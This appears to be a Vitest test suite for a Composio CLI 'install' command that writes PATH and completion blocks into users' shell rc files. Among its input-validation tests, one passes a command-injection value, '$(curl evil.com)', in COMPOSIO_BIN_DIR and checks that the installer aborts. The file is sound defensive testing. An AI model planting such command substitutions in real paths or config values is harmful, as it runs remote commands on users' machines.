        Effect.gen(function* () {
          vi.stubEnv('SHELL', '');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('Could not detect your shell');
          expect(output).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(output).not.toContain('COMPOSIO_INSTALL_DIR');
          expect(output).toContain('Manual setup required.');
        })
      );
    });
  });

  describe('[When] shell cannot be detected but the bin dir is already on $PATH', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] reports already on PATH instead of asking for manual setup', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '');
          const binDir = expectedRuntimeBinDir();
          vi.stubEnv('PATH', `${SAFE_PATH}:${binDir}`);

          yield* install();

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('already on $PATH');
          expect(output).toContain('Done');
          expect(output).not.toContain('Could not detect your shell');

          const fs = yield* FileSystem.FileSystem;
          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(false);
          expect(yield* fs.exists(path.join(os.homedir, '.bashrc'))).toBe(false);
        })
      );
    });
  });

  describe('[When] stderr is captured rather than a terminal', () => {
    layer(InstallTestLive({ terminalUI: capturedStderrUI }))(it => {
      it.scoped('[Then] still reports the rc file and how to reload the shell', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');

          yield* install();

          const output = capturedStderr.chunks.join('');
          expect(output).toContain('PATH: will add');
          expect(output).toContain('Updated ~/.zshrc');
          expect(output).toContain('Restart your shell to apply changes');
          expect(output).toContain('source ~/.zshrc');
        })
      );

      it.scoped('[Then] still shows manual setup instructions for an unknown shell', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const output = capturedStderr.chunks.join('');
          expect(output).toContain('Could not detect your shell');
          expect(output).toContain(`export PATH="${expectedBinDir}:$PATH"`);
        })
      );
    });
  });

  describe('[When] --shell zsh overrides a conflicting $SHELL', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] writes ~/.zshrc, not ~/.bashrc', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');

          yield* install({ shell: 'zsh' });

          const fs = yield* FileSystem.FileSystem;
          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(true);
          expect(yield* fs.exists(path.join(os.homedir, '.bashrc'))).toBe(false);
        })
      );
    });
  });

  describe('[When] --shell is parsed by the public CLI', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] a valid override reaches the requested shell integration', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');

          yield* cli(['install', '--shell', 'zsh']);

          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(true);
          expect(yield* fs.exists(path.join(os.homedir, '.bashrc'))).toBe(false);
        })
      );
    });
  });

  describe('[When] --shell has an unsupported value', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the public CLI rejects it during option parsing', () =>
        Effect.gen(function* () {
          const exit = yield* cli(['install', '--shell', 'powershell']).pipe(Effect.exit);
          expect(Exit.isFailure(exit)).toBe(true);
        })
      );
    });
  });

  describe('[When] both completion flags are parsed by the public CLI', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] --no-completions takes precedence', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');

          yield* cli(['install', '--completions', '--no-completions']);

          const contents = yield* fs.readFileString(path.join(os.homedir, '.bashrc'));
          expect(contents).toContain('# Composio CLI');
          expect(contents).not.toContain('# Composio CLI completions');
        })
      );
    });
  });

  describe('[When] --shell and --completions are combined on the public CLI', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the overridden shell gets both the PATH block and completions', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* cli(['install', '--shell', 'bash', '--completions']);

          const contents = yield* fs.readFileString(path.join(os.homedir, '.bashrc'));
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).toContain('# Composio CLI completions');
          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(false);
        })
      );
    });
  });

  describe('[When] --shell bash overrides a conflicting $SHELL', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] writes ~/.bashrc, not ~/.zshrc', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');

          yield* install({ shell: 'bash' });

          const fs = yield* FileSystem.FileSystem;
          expect(yield* fs.exists(path.join(os.homedir, '.bashrc'))).toBe(true);
          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(false);
        })
      );
    });
  });

  describe('[When] --shell fish is passed with $SHELL unset', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] writes config.fish', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '');

          yield* install({ shell: 'fish' });

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.config', 'fish', 'config.fish');
          expect(yield* fs.exists(rcPath)).toBe(true);
        })
      );
    });
  });

  describe('[When] --shell is explicit and the bin dir is already on the invoking $PATH', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] still writes the requested shell, and re-running stays idempotent', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');
          const binDir = expectedRuntimeBinDir();
          vi.stubEnv('PATH', `${SAFE_PATH}:${binDir}`);

          yield* install({ shell: 'zsh' });
          yield* install({ shell: 'zsh' });

          const fs = yield* FileSystem.FileSystem;
          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          const markerCount = contents.match(/^# Composio CLI$/gm)?.length ?? 0;
          expect(markerCount).toBe(1);
        })
      );
    });
  });

  describe('[When] auto-detected shell has its bin dir already on the invoking $PATH', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the rc file is still written, since a transient $PATH proves nothing', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');
          const binDir = expectedRuntimeBinDir();
          vi.stubEnv('PATH', `${SAFE_PATH}:${binDir}`);

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain(`export PATH="${binDir}:$PATH"`);

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('PATH: will add');
          expect(output).toContain('Restart your shell');
        })
      );
    });
  });

  describe('[When] a new .bash_profile appears after .bashrc was already configured', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the new .bash_profile gets the PATH block and .bashrc is left alone', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');
          const binDir = expectedRuntimeBinDir();
          vi.stubEnv('PATH', `${SAFE_PATH}:${binDir}`);

          // Simulate a prior `composio install` run that already configured .bashrc.
          const bashrcPath = path.join(os.homedir, '.bashrc');
          yield* fs.writeFileString(bashrcPath, `# Composio CLI\nexport PATH="${binDir}:$PATH"\n`);

          // .bash_profile shows up afterward and was never configured.
          const bashProfilePath = path.join(os.homedir, '.bash_profile');
          yield* fs.writeFileString(bashProfilePath, '# existing login config\n');

          yield* install();

          const bashProfileContents = yield* fs.readFileString(bashProfilePath);
          expect(bashProfileContents).toContain('# Composio CLI');
          // .bashrc already carries the exact current line, so it is untouched.
          expect(yield* fs.readFileString(bashrcPath)).toBe(
            `# Composio CLI\nexport PATH="${binDir}:$PATH"\n`
          );
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR is set to a custom directory', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] --shell zsh writes a PATH line for the custom directory', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');
          vi.stubEnv('COMPOSIO_BIN_DIR', '/custom/bin');

          yield* install({ shell: 'zsh' });

          const fs = yield* FileSystem.FileSystem;
          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain('export PATH="/custom/bin:$PATH"');
          expect(contents).not.toContain('$HOME');
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR is whitespace-only', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] it is treated as unset, not as a literal bin dir', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_BIN_DIR', '   ');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR has surrounding whitespace around a real value', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the surrounding whitespace is trimmed before it is used', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_BIN_DIR', '  /custom/bin  ');

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain('export PATH="/custom/bin:$PATH"');
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR is unset and ~/.local/bin/composio is the running executable', () => {
    layer(TestLive({ execPath: '.local/bin/composio' }))(it => {
      it.scoped('[Then] the PATH line targets ~/.local/bin via a literal $HOME prefix', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');

          const localBinDir = path.join(os.homedir, '.local', 'bin');
          const localBinComposio = path.join(localBinDir, 'composio');
          yield* fs.makeDirectory(localBinDir, { recursive: true });
          yield* fs.writeFileString(localBinComposio, '#!/bin/sh\n');

          yield* install();

          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain('export PATH="$HOME/.local/bin:$PATH"');
          expect(contents).not.toContain('~/.local/bin');
        })
      );
    });
  });

  describe('[When] ~/.local/bin/composio is a symlink chain to the running executable', () => {
    layer(TestLive({ execPath: '.composio-dist/composio' }))(it => {
      it.scoped('[Then] the PATH line still targets ~/.local/bin', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');

          const execDir = path.join(os.homedir, '.composio-dist');
          const execFile = path.join(execDir, 'composio');
          const intermediateLink = path.join(os.homedir, '.composio-launcher');
          const localBinDir = path.join(os.homedir, '.local', 'bin');
          yield* fs.makeDirectory(execDir, { recursive: true });
          yield* fs.makeDirectory(localBinDir, { recursive: true });
          yield* fs.writeFileString(execFile, '#!/bin/sh\n');
          yield* fs.symlink(execFile, intermediateLink);
          yield* fs.symlink(intermediateLink, path.join(localBinDir, 'composio'));

          yield* install();

          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain('export PATH="$HOME/.local/bin:$PATH"');
        })
      );
    });
  });

  describe('[When] ~/.local/bin/composio is a foreign program (e.g. a leftover pip install)', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the PATH line targets the running executable directory instead', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          const localBinDir = path.join(os.homedir, '.local', 'bin');
          yield* fs.makeDirectory(localBinDir, { recursive: true });
          yield* fs.writeFileString(path.join(localBinDir, 'composio'), '#!/usr/bin/env python\n');

          yield* install();

          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).not.toContain('.local/bin');
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR is set and ~/.local/bin/composio is also the running executable', () => {
    layer(InstallTestLive({ execPath: '.local/bin/composio' }))(it => {
      it.scoped('[Then] the env var wins over the ~/.local/bin fallback', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_BIN_DIR', '/custom/bin');

          const localBinDir = path.join(os.homedir, '.local', 'bin');
          const localBinComposio = path.join(localBinDir, 'composio');
          yield* fs.makeDirectory(localBinDir, { recursive: true });
          yield* fs.writeFileString(localBinComposio, '#!/bin/sh\n');

          yield* install();

          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain('export PATH="/custom/bin:$PATH"');
          expect(contents).not.toContain('.local/bin');
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR is unset and ~/.local/bin has no composio entry point', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the PATH line targets the real binary directory', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR contains characters that expand inside double quotes', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] aborts with an error', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_BIN_DIR', '/tmp/x$(curl evil.com)');

          const error = yield* install().pipe(Effect.flip);
          expect(error).toBeInstanceOf(ShellSetupAbortError);

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('Resolved bin directory');
          expect(output).toContain('unsafe characters');
          expect(output).toContain('Aborted');
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR is relative', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] aborts instead of persisting a relative PATH entry', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_BIN_DIR', './bin');

          const error = yield* install().pipe(Effect.flip);
          expect(error).toBeInstanceOf(ShellSetupAbortError);

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('must be an absolute path');
          expect(output).toContain('Aborted');
        })
      );
    });
  });

  describe('[When] COMPOSIO_BIN_DIR contains a PATH delimiter', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] aborts instead of persisting multiple PATH entries', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_BIN_DIR', '/custom/bin:/tmp/extra');

          const error = yield* install().pipe(Effect.flip);
          expect(error).toBeInstanceOf(ShellSetupAbortError);

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('Resolved bin directory');
          expect(output).toContain('unsafe characters');
          expect(output).toContain('Aborted');
        })
      );
    });
  });

  describe('[When] the resolved bin dir contains an apostrophe', () => {
    layer(InstallTestLive({ execPath: "/opt/o'brien/bin/composio" }))(it => {
      it.scoped("[Then] it is written verbatim, since `'` is literal inside double quotes", () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');

          yield* install();

          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
          expect(contents).toContain(`export PATH="/opt/o'brien/bin:$PATH"`);
        })
      );
    });
  });

  describe('[When] the runtime executable resolves to an unsafe directory', () => {
    layer(InstallTestLive({ execPath: '/tmp/we`ird/composio' }))(it => {
      it.scoped('[Then] reports an origin-neutral error', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');

          const error = yield* install().pipe(Effect.flip);
          expect(error).toBeInstanceOf(ShellSetupAbortError);

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('Resolved bin directory');
          expect(output).not.toContain('COMPOSIO_BIN_DIR contains');
          expect(output).toContain('Aborted');
        })
      );
    });
  });
});
